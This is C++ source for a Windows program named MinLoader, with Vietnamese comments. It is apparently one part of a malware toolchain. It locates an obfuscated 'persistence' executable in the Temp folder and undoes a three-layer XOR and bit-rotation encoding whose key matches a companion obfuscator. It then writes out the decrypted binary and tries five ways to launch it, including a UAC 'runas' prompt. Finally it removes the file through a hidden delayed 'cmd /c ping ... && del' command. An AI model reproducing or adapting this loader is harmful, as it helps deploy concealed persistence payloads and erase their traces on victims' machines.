#include <Windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <Shlobj.h>
#include <Shlwapi.h>
#include <direct.h>
#include <locale>
#include <codecvt>

// Chỉ giữ lại các định nghĩa cần thiết
#define HARDCODED_TEMP_PATH L"C:\\Users\\a\\AppData\\Local\\Temp\\"
#define HARDCODED_LOG_FILE "C:\\Users\\a\\AppData\\Local\\Temp\\minloader_debug.log"
#define PERSISTENCE_OBFUSCATED_FILE L"persistence_obfuscated.exe"

// Khóa giải mã - phải khớp với khóa trong Obfuscator.cpp
const unsigned char KEY[] = {
    0x89, 0x45, 0x32, 0xFA, 0xB7, 0x21, 0xD0, 0xE5,
    0x77, 0x19, 0xAC, 0x8B, 0x5D, 0x33, 0x69, 0xF1};

// Hàm hiển thị hộp thoại thông báo gỡ lỗi
void DebugMsg(const wchar_t *title, const wchar_t *msg)
{
    MessageBoxW(NULL, msg, title, MB_OK);
}

// Hàm ghi log vào file - hai phiên bản để linh hoạt
void LogToFile(const std::string &message)
{
    // Luôn ghi vào đường dẫn cố định
    std::ofstream hardcodedLogFile(HARDCODED_LOG_FILE, std::ios::app);
    if (hardcodedLogFile)
    {
        hardcodedLogFile << message << std::endl;
        hardcodedLogFile.close();
    }
}

void LogToFileW(const std::wstring &message)
{
    std::string narrowMsg(message.begin(), message.end());
    LogToFile(narrowMsg);
}

// Chuyển đổi chuỗi Unicode sang chuỗi thông thường
std::string WideToNarrow(const std::wstring &wide)
{
    if (wide.empty())
        return std::string();

    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wide.c_str(), (int)wide.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wide.c_str(), (int)wide.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

// Kiểm tra sự tồn tại của file và trả về đường dẫn tuyệt đối nếu tìm thấy
std::wstring CheckFileExistence(const std::wstring &directory, const std::wstring &filename)
{
    std::wstring fullPath = directory + filename;

    // Ghi log thông tin kiểm tra
    LogToFile("Checking file existence: " + WideToNarrow(fullPath));

    DWORD attrs = GetFileAttributesW(fullPath.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY))
    {
        LogToFile("File found: " + WideToNarrow(fullPath));
        return fullPath;
    }

    LogToFile("File not found: " + WideToNarrow(fullPath));
    return L"";
}

// Giải mã dữ liệu - thứ tự ngược lại của mã hóa
void DecryptData(std::vector<unsigned char> &data)
{
    LogToFile("DecryptData called with data size: " + std::to_string(data.size()));

    try
    {
        // Hoàn tác lớp XOR cuối cùng
        for (size_t i = data.size() - 2; i != SIZE_MAX; i--)
        {
            data[i] ^= (data[i + 1] ^ 0xA5);
        }
        LogToFile("First layer of decryption complete");

        // Hoàn tác phép xoay (ROR)
        for (size_t i = 0; i < data.size(); i++)
        {
            data[i] = (data[i] >> 3) | (data[i] << 5); // Xoay phải 3 bit
        }
        LogToFile("Second layer of decryption complete");

        // Hoàn tác XOR với khóa
        const size_t keyLength = sizeof(KEY);
        for (size_t i = 0; i < data.size(); i++)
        {
            data[i] ^= KEY[i % keyLength];
        }
        LogToFile("Third layer of decryption complete");
    }
    catch (const std::exception &e)
    {
        LogToFile("Exception in DecryptData: " + std::string(e.what()));
    }
    catch (...)
    {
        LogToFile("Unknown exception in DecryptData");
    }
}

// Hàm giải mã file đã mã hóa và lưu vào thư mục temp
std::vector<std::wstring> DecryptToTempLocation(const std::wstring &encryptedPath)
{
    LogToFile("DecryptToTempLocation called for: " + std::string(encryptedPath.begin(), encryptedPath.end()));
    std::vector<std::wstring> outputPaths;

    try
    {
        // Đọc file đã mã hóa - chuyển đổi wstring sang string
        std::string narrowPath = WideToNarrow(encryptedPath);
        std::ifstream inFile(narrowPath, std::ios::binary);
        if (!inFile)
        {
            LogToFile("Failed to open encrypted file: " + std::string(encryptedPath.begin(), encryptedPath.end()));
            return outputPaths;
        }

        // Đọc tất cả nội dung vào vector
        std::vector<unsigned char> fileData(
            (std::istreambuf_iterator<char>(inFile)),
            (std::istreambuf_iterator<char>()));
        inFile.close();
        LogToFile("Read file data size: " + std::to_string(fileData.size()));

        // Giải mã dữ liệu
        DecryptData(fileData);

        // Lưu vào thư mục temp
        std::wstring tempFilePath = HARDCODED_TEMP_PATH;
        tempFilePath += L"decrypted_persistence.exe";

        try
        {
            LogToFile("Attempting to write to: " + std::string(tempFilePath.begin(), tempFilePath.end()));
            std::string narrowTempPath = WideToNarrow(tempFilePath);
            std::ofstream outFile(narrowTempPath, std::ios::binary);
            if (outFile)
            {
                outFile.write(reinterpret_cast<const char *>(fileData.data()), fileData.size());
                outFile.close();
                outputPaths.push_back(tempFilePath);
                LogToFile("Successfully wrote decrypted data to: " + std::string(tempFilePath.begin(), tempFilePath.end()));
            }
            else
            {
                LogToFile("Failed to create output file: " + std::string(tempFilePath.begin(), tempFilePath.end()));
            }
        }
        catch (const std::exception &e)
        {
            LogToFile("Exception writing to file " + std::string(tempFilePath.begin(), tempFilePath.end()) + ": " + e.what());
        }

        return outputPaths;
    }
    catch (const std::exception &e)
    {
        LogToFile("Exception in DecryptToTempLocation: " + std::string(e.what()));
        return outputPaths;
    }
    catch (...)
    {
        LogToFile("Unknown exception in DecryptToTempLocation");
        return outputPaths;
    }
}

// Thử nhiều phương pháp để chạy tệp thực thi
bool RunExecutableWithMultipleMethods(const std::wstring &exePath)
{
    LogToFile("RunExecutableWithMultipleMethods called for: " + std::string(exePath.begin(), exePath.end()));
    bool success = false;

    // Phương pháp 1: ShellExecuteEx với "runas" (hiện UAC)
    try
    {
        LogToFile("Trying ShellExecuteEx with runas");
        SHELLEXECUTEINFOW sei = {0};
        sei.cbSize = sizeof(sei);
        sei.lpVerb = L"runas";
        sei.lpFile = exePath.c_str();
        sei.nShow = SW_NORMAL;
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;

        if (ShellExecuteExW(&sei))
        {
            if (sei.hProcess)
            {
                CloseHandle(sei.hProcess);
                LogToFile("ShellExecuteEx with runas succeeded");
                success = true;
            }
            else
            {
                LogToFile("ShellExecuteEx with runas failed with error: " + std::to_string(GetLastError()));
            }
        }
    }
    catch (const std::exception &e)
    {
        LogToFile("Exception in ShellExecuteEx with runas: " + std::string(e.what()));
    }

    // Phương pháp 2: ShellExecuteEx không có verb (thực thi thông thường)
    if (!success)
    {
        try
        {
            LogToFile("Trying ShellExecuteEx without verb");
            SHELLEXECUTEINFOW sei = {0};
            sei.cbSize = sizeof(sei);
            sei.lpFile = exePath.c_str();
            sei.nShow = SW_NORMAL;
            sei.fMask = SEE_MASK_NOCLOSEPROCESS;

            if (ShellExecuteExW(&sei))
            {
                if (sei.hProcess)
                {
                    CloseHandle(sei.hProcess);
                    LogToFile("ShellExecuteEx without verb succeeded");
                    success = true;
                }
                else
                {
                    LogToFile("ShellExecuteEx without verb failed with error: " + std::to_string(GetLastError()));
                }
            }
        }
        catch (const std::exception &e)
        {
            LogToFile("Exception in ShellExecuteEx without verb: " + std::string(e.what()));
        }
    }

    // Phương pháp 3: CreateProcess
    if (!success)
    {
        try
        {
            LogToFile("Trying CreateProcess");
            STARTUPINFOW si = {sizeof(si)};
            PROCESS_INFORMATION pi = {0};

            if (CreateProcessW(
                    exePath.c_str(),
                    NULL,
                    NULL,
                    NULL,
                    FALSE,
                    0,
                    NULL,
                    NULL,
                    &si,
                    &pi))
            {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                LogToFile("CreateProcess succeeded");
                success = true;
            }
            else
            {
                LogToFile("CreateProcess failed with error: " + std::to_string(GetLastError()));
            }
        }
        catch (const std::exception &e)
        {
            LogToFile("Exception in CreateProcess: " + std::string(e.what()));
        }
    }

    // Phương pháp 4: WinExec (API cũ nhưng đôi khi hoạt động khi các phương pháp khác thất bại)
    if (!success)
    {
        try
        {
            LogToFile("Trying WinExec");
            std::string narrowPath(exePath.begin(), exePath.end());
            UINT result = WinExec(narrowPath.c_str(), SW_NORMAL);
            if (result > 31)
            { // Success codes are > 31
                LogToFile("WinExec succeeded");
                success = true;
            }
            else
            {
                LogToFile("WinExec failed with error: " + std::to_string(result));
            }
        }
        catch (const std::exception &e)
        {
            LogToFile("Exception in WinExec: " + std::string(e.what()));
        }
    }

    // Phương pháp 5: Gọi hàm system()
    if (!success)
    {
        try
        {
            LogToFile("Trying system() call");
            std::string narrowPath = "start \"\" \"" + std::string(exePath.begin(), exePath.end()) + "\"";
            int result = system(narrowPath.c_str());
            if (result == 0)
            {
                LogToFile("system() call succeeded");
                success = true;
            }
            else
            {
                LogToFile("system() call failed with error: " + std::to_string(result));
            }
        }
        catch (const std::exception &e)
        {
            LogToFile("Exception in system() call: " + std::string(e.what()));
        }
    }

    return success;
}

// Hàm xóa file sau khi thực thi
void DeleteFilesDelayed(const std::vector<std::wstring> &filePaths)
{
    for (const auto &filePath : filePaths)
    {
        std::wstring command = L"cmd.exe /c ping 127.0.0.1 -n 5 > nul && del \"" + filePath + L"\"";

        STARTUPINFOW si = {sizeof(si)};
        PROCESS_INFORMATION pi = {0};
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        if (CreateProcessW(NULL, (LPWSTR)command.c_str(), NULL, NULL, FALSE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            LogToFile("Set up delayed deletion for: " + std::string(filePath.begin(), filePath.end()));
        }
    }
}

// Lấy giá trị biến môi trường
std::wstring GetEnvironmentVariableW(const std::wstring &varName)
{
    wchar_t buffer[MAX_PATH] = {0};
    DWORD result = ::GetEnvironmentVariableW(varName.c_str(), buffer, MAX_PATH);
    if (result == 0 || result > MAX_PATH)
    {
        return L"";
    }
    return std::wstring(buffer);
}

// Tạo thư mục nếu chưa tồn tại
bool EnsureDirectoryExists(const std::wstring &dirPath)
{
    DWORD attrs = GetFileAttributesW(dirPath.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES)
    {
        // Thử tạo thư mục
        if (CreateDirectoryW(dirPath.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS)
        {
            LogToFile("Created directory: " + WideToNarrow(dirPath));
            return true;
        }
        LogToFile("Failed to create directory: " + WideToNarrow(dirPath) + " Error: " + std::to_string(GetLastError()));
        return false;
    }
    return ((attrs & FILE_ATTRIBUTE_DIRECTORY) != 0);
}

// Hàm lấy đường dẫn thư mục của file thực thi hiện tại
std::wstring GetExecutableDirectory()
{
    wchar_t exePath[MAX_PATH] = {0};
    if (GetModuleFileNameW(NULL, exePath, MAX_PATH) == 0)
    {
        // Ghi log lỗi nếu không lấy được đường dẫn
        // Sử dụng LogToFile trực tiếp vì GetExecutableDirectory có thể được gọi trước khi log được cấu hình đầy đủ
        std::ofstream errorLog(HARDCODED_LOG_FILE, std::ios::app);
        if (errorLog)
        {
            errorLog << "Failed to get executable path. Error: " + std::to_string(GetLastError()) << std::endl;
            errorLog.close();
        }
        return L""; // Trả về chuỗi rỗng nếu có lỗi
    }
    PathRemoveFileSpecW(exePath);         // Xóa tên file, chỉ giữ lại đường dẫn thư mục
    return std::wstring(exePath) + L"\\"; // Thêm dấu \ vào cuối để đảm bảo là thư mục
}

// Hàm chương trình chính
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Đảm bảo thư mục log tồn tại
    EnsureDirectoryExists(HARDCODED_TEMP_PATH);

    // Xóa file log khi bắt đầu
    {
        std::ofstream hardcodedLogFile(HARDCODED_LOG_FILE, std::ios::trunc);
        if (hardcodedLogFile)
        {
            hardcodedLogFile << "MinLoader starting (hardcoded log)..." << std::endl;
            hardcodedLogFile.close();
        }
    }

    try
    {
        // Ghi thông tin môi trường quan trọng
        LogToFile("Starting MinLoader. Looking for encrypted file in Temp directory.");

        // Lấy đường dẫn đến thư mục temp cố định
        LogToFile("Using hardcoded temp path: " + WideToNarrow(HARDCODED_TEMP_PATH));
        LogToFile("Log file will be written to: " + std::string(HARDCODED_LOG_FILE));
        LogToFile("Decrypted file will be written to: " + WideToNarrow(HARDCODED_TEMP_PATH) + "decrypted_persistence.exe");

        // Tìm file mục tiêu (PERSISTENCE_OBFUSCATED_FILE) trong thư mục Temp
        std::wstring targetFile = L"";
        LogToFile("Searching for " + WideToNarrow(PERSISTENCE_OBFUSCATED_FILE) + " in " + WideToNarrow(HARDCODED_TEMP_PATH));
        targetFile = CheckFileExistence(HARDCODED_TEMP_PATH, PERSISTENCE_OBFUSCATED_FILE);

        // Nếu không tìm thấy, hiển thị thông báo lỗi
        if (targetFile.empty())
        {
            LogToFile("Could not find " + WideToNarrow(PERSISTENCE_OBFUSCATED_FILE) + " in Temp directory: " + WideToNarrow(HARDCODED_TEMP_PATH));
            std::wstring errorMsg = L"Could not find ";
            errorMsg += PERSISTENCE_OBFUSCATED_FILE;
            errorMsg += L" in the Temp directory!";
            MessageBoxW(NULL, errorMsg.c_str(), L"Error", MB_ICONERROR);
            return 1;
        }

        LogToFile("Found target file: " + WideToNarrow(targetFile));

        // Giải mã và lưu vào thư mục temp
        std::vector<std::wstring> decodedPaths = DecryptToTempLocation(targetFile);
        if (decodedPaths.empty())
        {
            LogToFile("Failed to decrypt file to any location!");
            MessageBoxW(NULL, L"Could not decrypt file!", L"Error", MB_ICONERROR);
            return 1;
        }

        // Thử chạy file đã giải mã
        bool runSuccess = false;
        for (const auto &decodedPath : decodedPaths)
        {
            LogToFile("Attempting to run: " + WideToNarrow(decodedPath));
            if (RunExecutableWithMultipleMethods(decodedPath))
            {
                runSuccess = true;
                LogToFile("Successfully launched persistence from: " + WideToNarrow(decodedPath));
                break;
            }
        }

        if (!runSuccess)
        {
            LogToFile("Failed to run persistence with any method!");
            MessageBoxW(NULL, L"Failed to launch persistence!", L"Error", MB_ICONERROR);
            return 1;
        }

        // Xóa file tạm thời sau khi chạy
        DeleteFilesDelayed(decodedPaths);
        LogToFile("Set up delayed deletion of temp files");

        return 0;
    }
    catch (const std::exception &e)
    {
        LogToFile("Exception in WinMain: " + std::string(e.what()));
        MessageBoxW(NULL, L"An error occurred!", L"Error", MB_ICONERROR);
        return 1;
    }
    catch (...)
    {
        LogToFile("Unknown exception in WinMain");
        MessageBoxW(NULL, L"An unknown error occurred!", L"Error", MB_ICONERROR);
        return 1;
    }
}